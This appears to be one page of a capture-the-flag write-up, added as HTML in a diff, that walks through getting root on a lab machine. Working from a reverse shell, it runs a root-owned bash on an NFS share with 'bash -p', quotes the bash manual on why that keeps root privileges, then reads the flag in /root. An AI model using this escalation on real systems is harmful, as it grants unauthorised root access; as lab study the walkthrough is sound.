@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5. Privilege Escalation (Second flag)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">5. Privilege Escalation (Second flag)</h1><br/><br />1. On your “reverse shell” list the permissions of the “/bin/bash” file.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>mnt<span style="color:#a52a2a;font-weight:700">/</span>nfs<br /><span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al</div></div><br /><br />    <span style="color:#ffa500;">Output</span><br />    <img src="images/609-1.png" alt="images/609-1.png" /><br />    <br />    It has “root" permissions.<br /><br />2. Run the ‘bash" file as “root”.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$bash</span>&nbsp;-p</div></div> <br /><br />    The <a href="http://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files">bash</a> manual says:<br />  <br />    <strong>Invoked</strong><a name="h3-1"></a><h3> with unequal effective and real uid/gids</h3><br />    If Bash is started with the effective user (group) id not equal to the real user (group) id,   and the <code>-p</code> option is not supplied, no startup files are read, shell functions are not inherited   from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if   they appear in the environment, are ignored, and the effective user id is set to the real user   id. If the <code>-p</code> option is supplied at invocation, the startup behavior is the same, but the   effective user id is not reset.<br /><br />   <br />3. Go to the “root” directory and list the files.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>root<br /><span style="color:#6a5acd;font-weight:400">$ls</span>&nbsp;-al</div></div><br /><br />    <span style="color:#ffa500;">Output</span><br />    <img src="images/609-2.png" alt="images/609-2.png" /><br />    <br />4. Show up the flag.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$cat</span>&nbsp;root.txt</div></div> <br /><br />    <span style="color:#ffa500;">Output</span><br />    <img src="images/609-3.png" alt="images/609-3.png" />      </div></body></html>
